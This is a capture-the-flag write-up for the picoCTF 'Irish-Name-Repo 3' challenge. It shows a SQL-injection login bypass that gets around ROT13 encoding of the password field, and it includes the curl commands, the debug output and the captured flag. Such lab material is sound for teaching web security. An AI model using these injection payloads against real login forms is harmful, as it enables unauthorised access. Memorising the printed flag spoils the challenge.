## Description:
> There is a secure website running at http://2019shell1.picoctf.com:12271. Try to see if you can login as admin!
## Solution: 
The website offered an admin login page:
```html
            Username:
            Password:
```
The solution from the [Irish-Name-Repo_1](Irish-Name-Repo_1.md) and [Irish-Name-Repo_2](Irish-Name-Repo_2.md) didn't work anymore.
Using the debug interface, we can inspect the SQL query:
```console
root@kali:/media/sf_CTFs/pico/Irish-Name-Repo_3# curl "https://2019shell1.picoctf.com/problem/12271/login.php" --data "password=test&debug=1"
password: test
SQL query: SELECT * FROM admin where password = 'grfg'
Login failed.
```
It looks like the password was somehow encrypted. Given the fact that `t` was replaced with `g` twice, this might be a substitution cipher.
Let's try a simple injection:
```console
root@kali:/media/sf_CTFs/pico/Irish-Name-Repo_3# curl "https://2019shell1.picoctf.com/problem/12271/login.php" --data "password=' or 1=1--&debug=1"
password: ' or 1=1--
SQL query: SELECT * FROM admin where password = '' be 1=1--'
```
Now let's try again, sending `be` instead of `or`:
```console
root@kali:/media/sf_CTFs/pico/Irish-Name-Repo_3# curl "https://2019shell1.picoctf.com/problem/12271/login.php" --data "password=' be 1=1--&debug=1" && echo
password: ' be 1=1--
SQL query: SELECT * FROM admin where password = '' or 1=1--'
Logged in!Your flag is: picoCTF{3v3n_m0r3_SQL_ef7eac2f}
